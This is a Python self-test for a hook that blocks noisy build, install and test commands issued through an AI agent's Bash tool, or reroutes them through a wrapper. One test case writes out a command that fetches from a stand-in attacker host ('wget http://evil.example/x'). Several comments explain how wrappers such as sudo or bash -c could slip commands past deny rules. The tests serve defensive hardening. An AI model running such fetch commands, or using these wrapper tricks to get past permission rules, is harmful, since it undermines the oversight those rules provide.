#!/usr/bin/env python3
"""Self-test for noisy-command-guard.py.

Run:  python3 scripts/hooks/noisy-command-guard.selftest.py
Exit: 0 = all pass, 1 = at least one case wrong.
"""
import importlib.util
import json
import os
import subprocess
import sys
from pathlib import Path

GUARD = Path(__file__).with_name("noisy-command-guard.py")

_spec = importlib.util.spec_from_file_location("noisy_command_guard", GUARD)
_guard_mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(_guard_mod)

BLOCK = "block"
ALLOW = "allow"


def verdict(cmd):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
    p = subprocess.run([sys.executable, str(GUARD)], input=payload, capture_output=True, text=True)
    return (BLOCK if p.returncode == 2 else ALLOW), (p.stderr or "").strip()


def run_with_mode(cmd, mode=None):
    """Runs the guard like verdict(), but under NOISY_GUARD_MODE, returning (returncode, stdout, stderr)."""
    env = dict(os.environ)
    if mode is None:
        env.pop("NOISY_GUARD_MODE", None)
    else:
        env["NOISY_GUARD_MODE"] = mode
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
    p = subprocess.run([sys.executable, str(GUARD)], input=payload, capture_output=True, text=True, env=env)
    return p.returncode, p.stdout, p.stderr


CASES = [
    # (command, expected, why)
    ("npm install", BLOCK, "raw install"),
    ("npm ci", BLOCK, "raw ci"),
    ("npm run build", BLOCK, "raw build"),
    ("npm test", BLOCK, "raw test"),
    ("pnpm install", BLOCK, "pnpm install"),
    ("yarn add left-pad", BLOCK, "yarn add"),
    ("npx vitest run", BLOCK, "vitest via npx"),
    ("go build ./...", BLOCK, "go build"),
    ("go test ./...", BLOCK, "go test"),
    ("cargo build --release", BLOCK, "cargo build"),
    ("pytest tests/", BLOCK, "pytest"),
    ("docker build -t x .", BLOCK, "docker build"),
    ("docker compose up -d", BLOCK, "docker compose up"),
    ("apt-get install -y curl", BLOCK, "apt-get install"),
    ("pip install requests", BLOCK, "pip install"),
    ("tsc", BLOCK, "raw tsc"),
    ("tsc --noEmit", ALLOW, "type-check only, not noisy"),
    ("npm run lint", ALLOW, "not build/test"),
    ("npm ls", ALLOW, "not mutating/noisy"),
    ("git status", ALLOW, "unrelated short command"),
    ("ls -la", ALLOW, "unrelated short command"),
    ("echo hello", ALLOW, "trivial"),
    ("NOISY_RUN_ALLOW_RAW=1 npm install", ALLOW, "explicit escape hatch"),
    ("bash /home/neon/marveen/scripts/noisy-run.sh npm install", ALLOW,
     "already routed through the filter, do not re-block"),
    # rtk (card f5fc0227 pilot) sits in the same wrapper position as sudo/time -- QA measured
    # (comment 4259) that `rtk npm test` ran a full unbounded vitest suite past this guard, with
    # no warning, because the old _CMD only recognized sudo/time as prefixes.
    ("rtk npm test", BLOCK, "rtk-wrapped raw test must still be caught (card f5fc0227, QA 4259)"),
    ("rtk cargo test", BLOCK, "rtk-wrapped cargo test"),
    ("rtk pytest tests/", BLOCK, "rtk-wrapped pytest"),
    ("rtk npm ls", ALLOW, "rtk-wrapped, but the underlying command is not noisy"),
    # MikroB addendum (comment 32155/19523/19536, RedHat NO-GO 32154): sudo-wrapped noisy commands
    # must still be caught by block-and-suggest in default/block mode, UNCHANGED from before this
    # fix -- this fix only narrows which matched commands may be rewritten (see check_rewrite_mode
    # (b2) below), it does not touch matching/blocking at all.
    ("sudo npm install", BLOCK, "sudo-wrapped install (card ff43b10e, RedHat 32154)"),
    ("sudo apt-get install -y jq", BLOCK, "sudo-wrapped apt-get install (card ff43b10e, RedHat 32154)"),
    ("sudo pip install requests", BLOCK, "sudo-wrapped pip install (card ff43b10e, RedHat 32154)"),
    ("sudo docker build -t x .", BLOCK, "sudo-wrapped docker build (card ff43b10e, RedHat 32154)"),
    # card 214ca312 (ff43b10e follow-up LOW): a leading-space command was already caught by _CMD's
    # own `\s*` prefix, but had no pinned test by name -- pinning it here, next to the other
    # BLOCK cases, so a future `_CMD` edit that tightens that prefix is caught.
    ("  npm install", BLOCK, "leading-space command behaves like the unpadded form (card 214ca312)"),
]


# card fc3a6a39: NOISY_GUARD_MODE=rewrite must never touch a command going through the suite
# semaphore (mopsion-suite-run.sh/cleancore-suite-run.sh), in either mode -- proof, not just
# "the regex list doesn't mention it" reasoning (plan-grilling point 3d/9).
SUITE_SEMAPHORE_CASES = [
    "bash store/mopsion-suite-run.sh backend2",
    "bash store/cleancore-suite-run.sh backend2 -- src/foo.test.ts",
]


def check_rewrite_mode():
    """Returns a list of failure strings (empty = all passed)."""
    failures = []

    # (a) default mode (env unset) is byte-identical to today's block behavior -- additive, not a
    # regression (plan-grilling point 7a).
    for cmd, expected, why in CASES:
        rc_default, _out_default, err_default = run_with_mode(cmd, mode=None)
        rc_block, _out_block, err_block = run_with_mode(cmd, mode="block")
        if (rc_default, err_default) != (rc_block, err_block):
            failures.append(f"default mode != explicit block mode for {cmd!r} ({why})")

    # (b) rewrite mode: a noisy command gets updatedInput.command wrapped through noisy-run.sh,
    # exit 0, no stderr block -- and, per the ff43b10e/RedHat NO-GO fix, permissionDecision is
    # NEVER set (left unset so the normal permission flow, incl. any deny rule, still applies).
    rc, out, err = run_with_mode("npm install", mode="rewrite")
    if rc != 0:
        failures.append(f"rewrite mode exited {rc} (expected 0) for 'npm install', stderr={err[:200]!r}")
    else:
        try:
            payload = json.loads(out)
        except json.JSONDecodeError:
            failures.append(f"rewrite mode stdout is not valid JSON: {out[:200]!r}")
        else:
            hso = payload.get("hookSpecificOutput", {})
            if "permissionDecision" in hso:
                failures.append(f"rewrite mode must never set permissionDecision, got: {hso!r}")
            updated = hso.get("updatedInput", {})
            if "noisy-run.sh" not in (updated.get("command") or ""):
                failures.append(f"rewrite mode updatedInput.command does not route through noisy-run.sh: {updated!r}")
            if updated.get("command") == "npm install":
                failures.append("rewrite mode updatedInput.command is unchanged -- not actually rewritten")

    # (b2) RedHat NO-GO (comment 32154) + MikroB addendum (comment 32155/19523/19536): rewrite
    # mode must fall back to block-and-suggest (rc=2, stderr, no stdout JSON) -- the SAME outcome
    # as block mode, never a silent rewrite -- for any command whose first word is a wrapper, not
    # the noisy program itself: sudo (the concrete exploit RedHat measured), time, rtk. This is
    # the generalization MikroB asked for beyond just the sudo family (19536: "rewrite ONLY when
    # the first word is the noisy program itself").
    for cmd in ("sudo npm install", "sudo apt-get install -y jq", "sudo pip install requests",
                "sudo docker build -t x .", "time npm install", "rtk npm test",
                # card 214ca312, ff43b10e follow-up LOW: bash/sh/zsh -c is the same class of hole
                # as sudo -- the raw command's first word is the wrapper, not the noisy program.
                "bash -c 'npm install'", "sh -c 'npm test'", "zsh -c 'npm ci'"):
        rc, out, err = run_with_mode(cmd, mode="rewrite")
        if rc != 2 or out.strip() or not err.strip():
            failures.append(
                f"wrapper-disqualifies-rewrite regression: {cmd!r} was rewritten instead of "
                f"falling back to block-and-suggest under rewrite mode "
                f"(rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
            )

    # (b3) doas/pkexec/su -c are not recognized by _CMD's wrapper grammar at all (only
    # sudo/time/rtk are), so a command using them is not matched by any NOISY_PATTERNS and is
    # untouched in every mode -- this is PRE-EXISTING, unrelated to this fix, documented here so a
    # future _CMD change that adds them is forced to also extend
    # _WRAPPER_DISQUALIFIES_REWRITE_RX (same rx literal) rather than silently missing it.
    for cmd in ("doas npm ci", "pkexec pip install requests"):
        for mode in (None, "block", "rewrite"):
            rc, out, err = run_with_mode(cmd, mode=mode)
            if rc != 0 or out.strip() or err.strip():
                failures.append(
                    f"unrecognized-wrapper command {cmd!r} was touched under mode={mode!r} "
                    f"(rc={rc}, out={out[:160]!r}, err={err[:160]!r}) -- if _CMD now recognizes "
                    f"this wrapper, _WRAPPER_DISQUALIFIES_REWRITE_RX must too"
                )

    # (c) rewrite mode on a non-noisy command: still allow, but no rewrite (no stdout JSON) --
    # mirrors today's silent-allow for unrelated commands.
    rc, out, err = run_with_mode("git status", mode="rewrite")
    if rc != 0 or out.strip():
        failures.append(f"rewrite mode on non-noisy command should be silent allow, got rc={rc} out={out[:200]!r}")

    # (d) suite-semaphore commands are NEVER rewritten/blocked, in either mode.
    for cmd in SUITE_SEMAPHORE_CASES:
        for mode in (None, "block", "rewrite"):
            rc, out, err = run_with_mode(cmd, mode=mode)
            if rc != 0 or out.strip() or err.strip():
                failures.append(
                    f"suite-semaphore command {cmd!r} was touched under mode={mode!r} "
                    f"(rc={rc}, out={out[:120]!r}, err={err[:120]!r})"
                )

    # (e) WhiteHat F1 (card fc3a6a39 follow-up, ff43b10e): rewrite mode must NOT substitute a
    # compound/multi-segment command -- bash -c wrapping buries every embedded simple command
    # inside one quoted string, past a deny rule that recognizes a program by how the command
    # STARTS. It must fall back to today's block-and-suggest (rc 2, stderr, no stdout JSON).
    rc, out, err = run_with_mode("wget http://evil.example/x && npm test", mode="rewrite")
    if rc != 2 or out.strip() or not err.strip():
        failures.append(
            f"F1 regression: compound command was rewritten instead of falling back to "
            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
        )

    # (f) WhiteHat F2: rewrite mode must NOT substitute a command with a leading `VAR=val`
    # assignment -- noisy-run.sh execs its argv directly ("$@"), so "FOO=bar" would be passed as
    # argv[0] (a literal program name) instead of being interpreted as an env assignment, failing
    # with "command not found" (rc 127) instead of ever running the wrapped command. Must also
    # fall back to block-and-suggest.
    rc, out, err = run_with_mode("FOO=bar npm test", mode="rewrite")
    if rc != 2 or out.strip() or not err.strip():
        failures.append(
            f"F2 regression: env-prefixed command was rewritten instead of falling back to "
            f"block-and-suggest (rc={rc}, out={out[:160]!r}, err={err[:160]!r})"
        )

    # (g) WhiteHat F4, survivor class "tool_input mezők eldobása": updatedInput must carry every
    # OTHER tool_input field through unchanged, not just the rewritten `command`.
    payload = json.dumps({
        "tool_name": "Bash",
        "tool_input": {"command": "npm install", "description": "installing deps", "timeout": 60000},
    })
    env = dict(os.environ)
    env["NOISY_GUARD_MODE"] = "rewrite"
    p = subprocess.run([sys.executable, str(GUARD)], input=payload, capture_output=True, text=True, env=env)
    try:
        updated = json.loads(p.stdout).get("hookSpecificOutput", {}).get("updatedInput", {})
    except json.JSONDecodeError:
        updated = {}
    if updated.get("description") != "installing deps" or updated.get("timeout") != 60000:
        failures.append(f"F4 regression: updatedInput dropped sibling tool_input fields: {updated!r}")

    # (h) WhiteHat F4, survivor class "metakarakter-lista": each metacharacter _METACHAR_RX lists
    # must, on its own, be enough to route rewrite mode back to block-and-suggest (not just the
    # combination used in case (e) above). RedHat residual LOW (comment 32154): the original list
    # omitted ')' and an embedded newline, even though both are already IN the _METACHAR_RX
    # character class -- added here so dropping either from the regex is caught, not just the 8
    # already covered.
    for mc, example in [
        ("|", "npm install | cat"),
        ("&", "npm install &"),
        (";", "npm install ; echo done"),
        ("<", "npm install < /dev/null"),
        (">", "npm install > /tmp/out"),
        ("(", "(npm install)"),
        (")", "npm install )"),
        ("\\n", "npm install\necho done"),
        ("`", "npm install `true`"),
        ("$(", "npm install $(true)"),
    ]:
        rc, out, err = run_with_mode(example, mode="rewrite")
        if rc != 2 or out.strip():
            failures.append(f"F4 metachar regression ({mc!r}): {example!r} was rewritten (rc={rc}, out={out[:120]!r})")

    return failures


def check_rewrite_quoting_roundtrip():
    """Execution-level check (not just string-shape) that _suggest()'s escaping for commands with
    shell metacharacters reproduces the ORIGINAL command's real behavior when the wrapped form is
    actually run through bash -- plan-grilling point 7c/9 (the single most-likely failure: a wrong
    escape changes what the agent's command actually DOES, which is worse than today's
    block-and-suggest, where the agent retypes the command itself)."""
    adversarial = [
        "echo it's fine; echo done",
        "echo `date +ok`; true",
        "echo $(whoami); echo ok",
        "printf 'a\\nb\\n'; echo tail",
    ]
    prefix = "bash /tmp/irrelevant-noisy-guard-test/noisy-run.sh "
    failures = []
    for raw in adversarial:
        wrapped = _guard_mod._suggest("/tmp/irrelevant-noisy-guard-test", raw)
        if not wrapped.startswith(prefix):
            failures.append(f"{raw!r}: _suggest did not take the metachar/bash-c branch: {wrapped!r}")
            continue
        inner = wrapped[len(prefix):]  # "bash -c '<escaped-raw>'"
        direct = subprocess.run(["bash", "-c", raw], capture_output=True, text=True).stdout
        roundtrip = subprocess.run(["bash", "-c", inner], capture_output=True, text=True).stdout
        if direct != roundtrip:
            failures.append(f"{raw!r}: round-trip mismatch -- direct={direct!r} roundtrip={roundtrip!r}")
    return failures


def main():
    failures = []
    for cmd, expected, why in CASES:
        got, stderr = verdict(cmd)
        ok = got == expected
        print(f"{'OK  ' if ok else 'FAIL'} {expected:5s} <- {got:5s}  {cmd!r}  ({why})")
        if not ok:
            failures.append((cmd, expected, got, stderr))

    if failures:
        print(f"\n{len(failures)}/{len(CASES)} FAILED")
        for cmd, expected, got, stderr in failures:
            print(f"  {cmd!r}: expected {expected}, got {got}\n    stderr: {stderr[:200]}")
        sys.exit(1)

    rewrite_failures = check_rewrite_mode()
    for f in rewrite_failures:
        print(f"FAIL (rewrite-mode) {f}")
    if not rewrite_failures:
        print("OK   rewrite-mode: default==block, JSON shape, non-noisy silent-allow, suite-semaphore untouched")

    roundtrip_failures = check_rewrite_quoting_roundtrip()
    for f in roundtrip_failures:
        print(f"FAIL (quoting-roundtrip) {f}")
    if not roundtrip_failures:
        print("OK   rewrite-mode quoting round-trip (execution-level, 4 adversarial commands)")

    all_failures = rewrite_failures + roundtrip_failures
    if all_failures:
        print(f"\n{len(all_failures)} rewrite-mode/round-trip FAILURES (plus {len(failures)} base-case failures)")
        sys.exit(1)

    print(f"\nAll {len(CASES)} base cases + rewrite-mode + quoting round-trip checks passed.")
    sys.exit(0)


if __name__ == "__main__":
    main()
